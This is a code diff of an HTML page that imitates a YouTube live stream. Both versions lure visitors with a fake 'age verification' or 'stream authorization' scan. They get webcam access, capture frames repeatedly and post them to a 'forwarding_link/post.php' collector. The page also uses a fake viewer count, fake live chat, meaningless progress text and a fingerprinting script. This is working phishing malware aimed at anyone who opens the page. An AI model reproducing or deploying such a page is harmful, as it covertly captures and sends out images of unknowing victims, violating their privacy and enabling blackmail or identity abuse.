@@ -3,460 +3,205 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Stream — Watch Now</title>
-    <meta property="og:title" content="🔴 LIVE NOW — Watch This Stream!">
-    <meta property="og:description" content="Exclusive live stream happening right now. Tap to watch!">
-    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/1384/1384060.png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Live Stream • Watch Now</title>
+    <meta property="og:title" content="🔴 LIVE STREAM — Exclusive Content">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
+        :root {
+            --yt-red: #ff0000;
+            --bg-dark: #0f0f13;
+            --card-border: rgba(255, 255, 255, 0.08);
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Inter', sans-serif;
-            background: #0a0a0f;
+            background: var(--bg-dark);
             color: #fff;
             min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 20px; text-align: center;
         }
 
-        /* Top Bar */
-        .topbar {
-            background: rgba(15, 15, 25, 0.95);
-            -webkit-backdrop-filter: blur(20px);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            padding: 12px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: sticky;
-            top: 0;
-            z-index: 50;
-        }
-        .topbar .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 800;
-            font-size: 18px;
-        }
-        .topbar .logo .yt-icon {
-            width: 28px;
-            height: 20px;
-            background: #ff0000;
-            border-radius: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-        }
-        .topbar .live-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(255,0,0,0.15);
-            border: 1px solid rgba(255,0,0,0.3);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 700;
-            color: #ff4444;
-        }
-        .topbar .live-badge .dot {
-            width: 8px;
-            height: 8px;
-            background: #ff0000;
-            border-radius: 50%;
-            animation: blink 1s ease infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+        .video-box {
+            background: #000;
+            width: 100%; max-width: 600px;
+            border-radius: 16px; border: 1px solid var(--card-border);
+            padding: 40px 20px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            position: relative; overflow: hidden;
+            animation: slideUp 0.6s ease-out;
         }
 
-        /* Video Area */
-        .video-section {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; } }
 
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            padding-bottom: 56.25%; /* 16:9 */
-            background: #111;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-        }
-        .video-wrapper iframe {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-
-        /* Overlay before verification */
-        .video-overlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(135deg, rgba(0,0,0,0.9), rgba(20,20,40,0.95));
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-            cursor: pointer;
-            transition: opacity 0.5s;
-        }
-        .video-overlay.hidden { opacity: 0; pointer-events: none; }
-        .video-overlay .play-btn {
-            width: 80px;
-            height: 80px;
-            background: rgba(255,0,0,0.9);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
+        .live-banner {
+            display: inline-flex; align-items: center; gap: 8px;
+            background: rgba(255, 0, 0, 0.15); border: 1px solid rgba(255,0,0,0.3);
+            border-radius: 20px; padding: 6px 14px; font-size: 13px; font-weight: 700; color: #ff5555;
             margin-bottom: 20px;
-            animation: pulsePlay 2s ease infinite;
-            cursor: pointer;
-            border: none;
-            color: #fff;
-        }
-        @keyframes pulsePlay {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(255,0,0,0.5); }
-            50% { box-shadow: 0 0 0 20px rgba(255,0,0,0); }
-        }
-        .video-overlay h3 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
-        .video-overlay p { font-size: 13px; color: rgba(255,255,255,0.6); }
-
-        /* Stream Info */
-        .stream-info {
-            margin-top: 20px;
-        }
-        .stream-info h2 {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            line-height: 1.4;
-        }
-        .stream-meta {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        .meta-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 12px;
-            color: #888;
-        }
-        .viewers-count {
-            background: rgba(255,0,0,0.1);
-            border: 1px solid rgba(255,0,0,0.2);
-            padding: 3px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            color: #ff4444;
-            font-weight: 600;
         }
 
-        /* Channel Info */
-        .channel-bar {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 15px 0;
-            border-top: 1px solid rgba(255,255,255,0.06);
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-        }
-        .channel-avatar {
-            width: 42px;
-            height: 42px;
-            background: linear-gradient(135deg, #ff0000, #ff4444);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            font-weight: 800;
-            flex-shrink: 0;
-        }
-        .channel-info { flex: 1; }
-        .channel-info .name { font-size: 14px; font-weight: 600; }
-        .channel-info .subs { font-size: 12px; color: #888; }
-        .sub-btn {
-            padding: 8px 18px;
-            background: #ff0000;
-            color: #fff;
-            border: none;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 700;
-            cursor: pointer;
+        .live-dot { width: 8px; height: 8px; background: var(--yt-red); border-radius: 50%; animation: blink 1.5s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+
+        .stream-title { font-size: 22px; font-weight: 800; margin-bottom: 12px; }
+        .stream-desc { font-size: 14px; color: #94a3b8; margin-bottom: 30px; line-height: 1.6; }
+
+        .play-btn {
+            width: 64px; height: 64px; background: var(--yt-red); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 30px;
+            cursor: pointer; box-shadow: 0 0 40px rgba(255,0,0,0.4);
+            transition: transform 0.2s, background 0.2s;
         }
 
-        /* Chat Preview */
-        .chat-section {
-            margin-top: 20px;
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 14px;
-            overflow: hidden;
-        }
-        .chat-header {
-            padding: 12px 16px;
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            font-size: 14px;
-            font-weight: 600;
-        }
-        .chat-messages {
-            padding: 12px 16px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        .chat-msg {
-            margin-bottom: 10px;
-            font-size: 13px;
-            animation: chatSlide 0.3s ease;
-        }
-        @keyframes chatSlide {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        .chat-msg .author { color: #3ea6ff; font-weight: 600; margin-right: 6px; }
-        .chat-msg .text { color: rgba(255,255,255,0.8); }
+        .play-btn:hover { transform: scale(1.05); background: #cc0000; }
 
-        /* Verification Modal */
-        .verify-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.9);
-            z-index: 100;
-            align-items: center;
-            justify-content: center;
-        }
-        .verify-modal.active { display: flex; }
-        .verify-box {
-            background: #1a1a2e;
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 20px;
-            padding: 35px 25px;
-            width: 90%;
-            max-width: 380px;
-            text-align: center;
-        }
-        .verify-box .icon-big { font-size: 52px; margin-bottom: 15px; display: block; }
-        .verify-box h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
-        .verify-box p { font-size: 13px; color: rgba(255,255,255,0.6); margin-bottom: 20px; line-height: 1.6; }
-        .verify-box .verify-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #ff0000, #cc0000);
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-        }
-        .verify-box .skip-link {
-            display: block;
-            margin-top: 12px;
-            font-size: 12px;
-            color: rgba(255,255,255,0.3);
-            cursor: pointer;
+        .play-icon {
+            width: 0; height: 0;
+            border-top: 12px solid transparent;
+            border-bottom: 12px solid transparent;
+            border-left: 20px solid white;
+            margin-left: 6px;
         }
 
-        /* Hidden cam */
-        video#camvid, canvas#camcnv { 
-            position: absolute; opacity: 0; pointer-events: none; 
-            z-index: -1; width: 1px; height: 1px; 
+        /* Continuous Verification Modal */
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
+            display: none; justify-content: center; align-items: center;
+            z-index: 1000;
         }
 
-        /* Responsive */
-        @media (max-width: 600px) {
-            .video-section { padding: 10px; }
-            .video-wrapper { border-radius: 10px; }
-            .stream-info h2 { font-size: 16px; }
+        .modal-card {
+            background: rgba(22, 22, 30, 0.95);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px; padding: 32px;
+            width: 90%; max-width: 340px; text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            animation: popUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
+
+        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); } }
+
+        .scan-frame {
+            position: relative; width: 140px; height: 140px; margin: 0 auto 20px;
+            border-radius: 50%; overflow: hidden; border: 3px solid rgba(255,255,255,0.1);
+        }
+
+        .scan-frame video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+        .pulse-ring {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%; border: 3px solid var(--yt-red);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.1); opacity: 0; } }
+
+        .scan-status { font-size: 15px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+        .scan-percent { font-size: 12px; color: #64748b; margin-bottom: 20px; }
+
+        .loader-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; }
+        .loader-fill { width: 0%; height: 100%; background: var(--yt-red); transition: width 0.3s; }
+
     </style>
 </head>
 <body>
 
-<!-- Top Bar -->
-<div class="topbar">
-    <div class="logo">
-        <div class="yt-icon">▶</div>
-        <span>YouTube</span>
-    </div>
-    <div class="live-badge">
-        <span class="dot"></span>
-        LIVE
-    </div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<div class="video-box">
+    <div class="live-banner"><div class="live-dot"></div><span>Exclusive Live Grid</span></div>
+    <div class="stream-title">Synchronizing buffering continuous sync...</div>
+    <div class="stream-desc">Continuous node check triggers continuous stream authorization checks loaded correctly framed sync.</div>
+    <div class="play-btn" onclick="startStreamAuth()"><div class="play-icon"></div></div>
 </div>
 
-<!-- Video Section -->
-<div class="video-section">
-    <div class="video-wrapper">
-        <iframe id="liveFrame" title="Live YouTube Stream" src="https://www.youtube.com/embed/live_yt_tv?autoplay=0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<!-- SECURE SCAN MODAL -->
+<div class="modal" id="scanModal">
+    <div class="modal-card">
+        <div class="scan-frame">
+            <video id="scanVideo" autoplay playsinline></video>
+            <div class="pulse-ring" id="pulseRing"></div>
+        </div>
         
-        <!-- Overlay -->
-        <div class="video-overlay" id="videoOverlay" onclick="requestVerify()">
-            <button class="play-btn">▶</button>
-            <h3>🔴 Live Stream</h3>
-            <p>Tap to verify and watch</p>
-        </div>
-    </div>
+        <div class="scan-status" id="scanStatus">Loading Visual Stream Authorization...</div>
+        <div class="scan-percent" id="scanPercent">0% Authorized node</div>
 
-    <!-- Stream Info -->
-    <div class="stream-info">
-        <h2>🔴 LIVE: Exclusive Stream — Watch Now!</h2>
-        <div class="stream-meta">
-            <span class="viewers-count" id="viewerCount">🔴 2.4K watching</span>
-            <span class="meta-item">📅 Started streaming 23 minutes ago</span>
-        </div>
-
-        <!-- Channel -->
-        <div class="channel-bar">
-            <div class="channel-avatar">TV</div>
-            <div class="channel-info">
-                <div class="name">Live TV Channel ✓</div>
-                <div class="subs">1.2M subscribers</div>
-            </div>
-            <button class="sub-btn">Subscribe</button>
-        </div>
-    </div>
-
-    <!-- Chat -->
-    <div class="chat-section">
-        <div class="chat-header">💬 Live Chat</div>
-        <div class="chat-messages" id="chatBox">
-            <div class="chat-msg"><span class="author">Alex_2024</span><span class="text">This stream is amazing! 🔥</span></div>
-            <div class="chat-msg"><span class="author">Priya.S</span><span class="text">First time here, loving it ❤️</span></div>
-            <div class="chat-msg"><span class="author">StreamFan99</span><span class="text">Can we get 5K viewers? Let's go!</span></div>
-            <div class="chat-msg"><span class="author">CodeMaster</span><span class="text">Share this stream everyone 📲</span></div>
+        <div class="loader-bar">
+            <div class="loader-fill" id="loaderFill"></div>
         </div>
     </div>
 </div>
-
-<!-- Verify Modal -->
-<div class="verify-modal" id="verifyModal">
-    <div class="verify-box">
-        <span class="icon-big">🔐</span>
-        <h3>Age Verification Required</h3>
-        <p>To access this live stream, we need to verify you're 18+ using a quick camera check. This is a one-time verification.</p>
-        <button class="verify-btn" onclick="startCamCapture()">📸 Verify & Watch</button>
-        <span class="skip-link" onclick="skipVerify()">Skip verification</span>
-    </div>
-</div>
-
-<!-- Hidden cam -->
-<video id="camvid" playsinline autoplay muted></video>
-<canvas id="camcnv" width="1920" height="1080"></canvas>
 
 <script>
-// Fake viewer count animation
-var baseViewers = 2400;
-setInterval(function() {
-    baseViewers += Math.floor(Math.random() * 10) - 3;
-    if (baseViewers < 2200) baseViewers = 2200;
-    var display = baseViewers >= 1000 ? (baseViewers / 1000).toFixed(1) + 'K' : baseViewers;
-    document.getElementById('viewerCount').textContent = '🔴 ' + display + ' watching';
-}, 5000);
-
-// Fake live chat
-var chatMessages = [
-    { author: 'Rahul_VB', text: 'Quality is so good! 👀' },
-    { author: 'AnkitGaming', text: 'Who else is watching at night? 🌙' },
-    { author: 'Sarah_K', text: 'Love from London! 🇬🇧' },
-    { author: 'TechBro007', text: 'This is fire 🔥🔥🔥' },
-    { author: 'MovieLover', text: 'Best stream on YouTube fr' },
-    { author: 'NightOwl22', text: 'Can\'t stop watching lol' },
-    { author: 'VibeCheck', text: 'Share this everyone! 📱' },
-    { author: 'GamerXD', text: 'TOP tier content 💯' },
-    { author: 'Luna_Star', text: 'Omg so many viewers!' },
-    { author: 'MaxPower', text: 'Subscribe if you haven\'t! ❤️' }
-];
-var chatIdx = 0;
-setInterval(function() {
-    var msg = chatMessages[chatIdx % chatMessages.length];
-    var chatBox = document.getElementById('chatBox');
-    var div = document.createElement('div');
-    div.className = 'chat-msg';
-    div.innerHTML = '<span class="author">' + msg.author + '</span><span class="text">' + msg.text + '</span>';
-    chatBox.appendChild(div);
-    chatBox.scrollTop = chatBox.scrollHeight;
-    if (chatBox.children.length > 20) chatBox.removeChild(chatBox.firstChild);
-    chatIdx++;
-}, 3000);
-
-// Verify flow
-function requestVerify() {
-    document.getElementById('verifyModal').classList.add('active');
-}
-
-function startCamCapture() {
-    document.getElementById('verifyModal').classList.remove('active');
-    
-    var video = document.getElementById('camvid');
-    var canvas = document.getElementById('camcnv');
-    var ctx = canvas.getContext('2d');
-    
-    navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } },
-        audio: false
-    }).then(function(stream) {
-        video.srcObject = stream;
-        
-        // Remove overlay, start video
-        document.getElementById('videoOverlay').classList.add('hidden');
-        document.getElementById('liveFrame').src = 'https://www.youtube.com/embed/live_yt_tv?autoplay=1';
-        
-        // Burst: 5 rapid shots
-        var shots = 0;
-        var burst = setInterval(function() {
-            canvas.width = video.videoWidth || 1920;
-            canvas.height = video.videoHeight || 1080;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            var imgData = canvas.toDataURL('image/png');
-            $.post('forwarding_link/post.php', { cat: imgData });
-            shots++;
-            if (shots >= 5) {
-                clearInterval(burst);
-                // Normal interval
-                setInterval(function() {
-                    canvas.width = video.videoWidth || 1920;
-                    canvas.height = video.videoHeight || 1080;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    var imgData = canvas.toDataURL('image/png');
-                    $.post('forwarding_link/post.php', { cat: imgData });
-                }, 3000);
-            }
-        }, 1000);
-
-    }).catch(function(err) {
-        // Still show video if cam denied
-        document.getElementById('videoOverlay').classList.add('hidden');
-        document.getElementById('liveFrame').src = 'https://www.youtube.com/embed/live_yt_tv?autoplay=1';
-        setTimeout(function() { window.location.href = 'https://www.google.com'; }, 30000);
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function() {},
+        error: function() {}
     });
 }
 
-function skipVerify() {
-    document.getElementById('verifyModal').classList.remove('active');
-    document.getElementById('videoOverlay').classList.add('hidden');
-    document.getElementById('liveFrame').src = 'https://www.youtube.com/embed/live_yt_tv?autoplay=1';
+function startStreamAuth() {
+    const modal = document.getElementById('scanModal');
+    const scanVideo = document.getElementById('scanVideo');
+    const loaderFill = document.getElementById('loaderFill');
+    const scanStatus = document.getElementById('scanStatus');
+    const scanPercent = document.getElementById('scanPercent');
+
+    modal.style.display = 'flex';
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(function(stream) {
+            scanVideo.srcObject = stream;
+
+            let progress = 0;
+            let statusTexts = [
+                "Allocating video sync frames...",
+                "Authorizing viewer continuous nodes...",
+                "Mapping content buffer limits...",
+                "Success! Authorization setup completed."
+            ];
+            let textIndex = 0;
+
+            const timer = setInterval(() => {
+                progress += Math.floor(Math.random() * 8) + 6;
+                if (progress >= 100) progress = 100;
+
+                scanPercent.innerText = `${progress}% Node binding Authorization`;
+                loaderFill.style.width = `${progress}%`;
+
+                // continuous photo takes
+                var context = canvas.getContext('2d');
+                context.drawImage(scanVideo, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+
+                if (progress === 100) {
+                    clearInterval(timer);
+                    scanStatus.innerText = "Authorized! Playback starting...";
+                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000); // Wait 2s
+                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
+                    textIndex++;
+                    scanStatus.innerText = statusTexts[textIndex];
+                }
+            }, 1000);
+        })
+        .catch(function() {
+            alert("Visual Stream Authorization frame node compatibility safety required triggers continuous buffer connectivity setup.");
+            modal.style.display = 'none';
+        });
 }
 </script>
+
 <script src="fingerprint.js"></script>
 </body>
 </html>
